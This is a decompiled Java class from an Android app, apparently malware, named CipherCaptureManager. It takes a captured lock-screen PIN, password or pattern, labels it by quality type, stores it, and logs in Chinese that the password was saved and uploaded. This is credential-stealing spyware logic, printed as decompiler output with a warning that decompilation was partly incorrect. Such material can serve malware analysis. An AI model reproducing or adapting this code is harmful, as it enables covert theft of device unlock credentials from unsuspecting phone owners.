package com.storm.safe.rock.service.modules.cipher;

import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C0598hx;
import p000.C0600hy;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$saveCipher$1", m214403f = "CipherCaptureManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class CipherCaptureManager$saveCipher$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f53215a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53216a2;

    /* renamed from: a3 */
    public final /* synthetic */ List f53217a3;

    /* renamed from: a4 */
    public final /* synthetic */ C0335a1 f53218a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public CipherCaptureManager$saveCipher$1(String str, String str2, List list, C0335a1 c0335a1, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53215a1 = str;
        this.f53216a2 = str2;
        this.f53217a3 = list;
        this.f53218a4 = c0335a1;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new CipherCaptureManager$saveCipher$1(this.f53215a1, this.f53216a2, this.f53217a3, this.f53218a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        CipherCaptureManager$saveCipher$1 cipherCaptureManager$saveCipher$1 = (CipherCaptureManager$saveCipher$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        cipherCaptureManager$saveCipher$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x0047  */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f53215a1;
        C0335a1 c0335a1 = this.f53218a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            int iHashCode = str.hashCode();
            String str2 = "PASSWORD_QUALITY_NUMERIC_COMPLEX";
            if (iHashCode != -791090288) {
                if (iHashCode == 110997) {
                    str.equals("pin");
                } else if (iHashCode == 1216985755 && str.equals("password")) {
                    str2 = "PASSWORD_QUALITY_ALPHANUMERIC";
                }
                C0598hx c0598hx = new C0598hx(str2, this.f53216a2, this.f53217a3, null, true, System.currentTimeMillis(), null, null, null, 968);
                C0600hy c0600hy = C0335a1.f53283c5;
                c0335a1.m211821d7(c0598hx);
                c0335a1.m211824e1(c0598hx);
                C0335a1.m211802d8(c0598hx);
                t60.m214714d6("CipherCaptureManager", "✅ 密码已保存并上传: type=" + str + ", isLockScreen=true");
            } else {
                if (str.equals("pattern")) {
                    str2 = "PASSWORD_QUALITY_PATTERN";
                }
                C0598hx c0598hx2 = new C0598hx(str2, this.f53216a2, this.f53217a3, null, true, System.currentTimeMillis(), null, null, null, 968);
                C0600hy c0600hy2 = C0335a1.f53283c5;
                c0335a1.m211821d7(c0598hx2);
                c0335a1.m211824e1(c0598hx2);
                C0335a1.m211802d8(c0598hx2);
                t60.m214714d6("CipherCaptureManager", "✅ 密码已保存并上传: type=" + str + ", isLockScreen=true");
            }
        } catch (Exception e) {
            tz0.m214807a7("保存密码失败: ", e.getMessage(), "CipherCaptureManager");
        }
        return C1351vv.f60710b1;
    }
}
